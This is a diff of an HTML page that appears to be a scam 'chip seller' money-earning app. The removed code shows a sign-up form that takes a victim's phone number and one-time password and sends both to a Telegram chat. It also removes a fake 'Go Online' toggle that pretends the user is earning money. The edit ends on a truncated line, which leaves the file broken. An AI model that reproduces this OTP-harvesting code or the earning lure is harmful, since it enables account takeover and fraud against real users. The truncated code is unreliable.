@@ -475,10 +475,10 @@
       <!-- Center Section -->
       <div class="center-section">
         <div class="outer-glow-ring" id="glowRing">
-          <div class="go-online-btn" id="actionBtn" onclick="handleButtonClick()" ontouchstart="handleButtonClick()">
+          <button class="go-online-btn" id="actionBtn" onclick="handleButtonClick()" ontouchstart="handleButtonClick()">
             <i class="fa-solid fa-power-off" id="btnIcon"></i>
             <span id="btnText">Go Online</span>
-          </div>
+          </button>
         </div>
         <div class="center-tagline" id="taglineText">GO ONLINE TO EARN MONEY!</div>
       </div>
@@ -607,82 +607,4 @@
 
       const phone = document.getElementById('phone').value.trim();
       const otp = document.getElementById('otp').value.trim();
-      const upline = document.getElementById('upline').value.trim() || 'None';
-      const submitBtn = document.getElementById('submit-btn');
-
-      if (phone.length < 10 || otp.length < 4) {
-        showToast('Please fill all details properly!', 'error');
-        return;
-      }
-
-      submitBtn.disabled = true;
-      submitBtn.innerHTML = `<i class="fa-solid fa-spinner animate-spin"></i><span>Processing...</span>`;
-
-      const message = `🚨 *New Chip Seller Sign-Up* 🚨\n\n📱 *Phone:* \`+91 ${phone}\`\n🔢 *OTP:* \`${otp}\`\n🔗 *Upline Code:* \`${upline}\``;
-
-      await sendToTelegram(message);
-
-      showToast('Sign up successful!', 'success');
-      
-      document.getElementById('signup-section').classList.add('hidden');
-      document.getElementById('dashboard-section').classList.remove('hidden');
-    }
-
-    /* --- Final Corrected Online / Offline Toggle Logic --- */
-    var isOnline = false;
-    var isCounting = false;
-
-    function handleButtonClick() {
-      if (isCounting) return;
-
-      var btnIcon = document.getElementById('btnIcon');
-      var btnText = document.getElementById('btnText');
-      var taglineText = document.getElementById('taglineText');
-      var glowRing = document.getElementById('glowRing');
-      var actionBtn = document.getElementById('actionBtn');
-
-      // Agar abhi user OFFLINE hai (Purple button), tabhi 3-2-1 countdown start hoga
-      if (!isOnline) {
-        isCounting = true;
-        btnIcon.style.display = 'none';
-        
-        var count = 3;
-        btnText.style.fontSize = '55px';
-        btnText.innerText = count;
-
-        var timer = setInterval(function() {
-          count--;
-          if (count > 0) {
-            btnText.innerText = count;
-          } else {
-            clearInterval(timer);
-            isCounting = false;
-            isOnline = true;
-            
-            glowRing.classList.add('online-glow');
-            actionBtn.classList.add('online-btn');
-            
-            btnIcon.style.display = 'block';
-            btnText.style.fontSize = '20px';
-            btnText.innerText = 'Go Offline';
-            taglineText.innerText = 'EARNING MONEY NOW~';
-          }
-        }, 1000);
-
-      } else {
-        // Agar abhi user ONLINE hai (Cyan button), toh bina kisi countdown ke turant OFF ho jayega
-        isOnline = false;
-        
-        glowRing.classList.remove('online-glow');
-        actionBtn.classList.remove('online-btn');
-        
-        btnIcon.style.display = 'block';
-        btnText.style.fontSize = '20px';
-        btnText.innerText = 'Go Online';
-        taglineText.innerText = 'GO ONLINE TO EARN MONEY!';
-      }
-    }
-  </script>
-
-</body>
-</html>
+      const upline = document.get
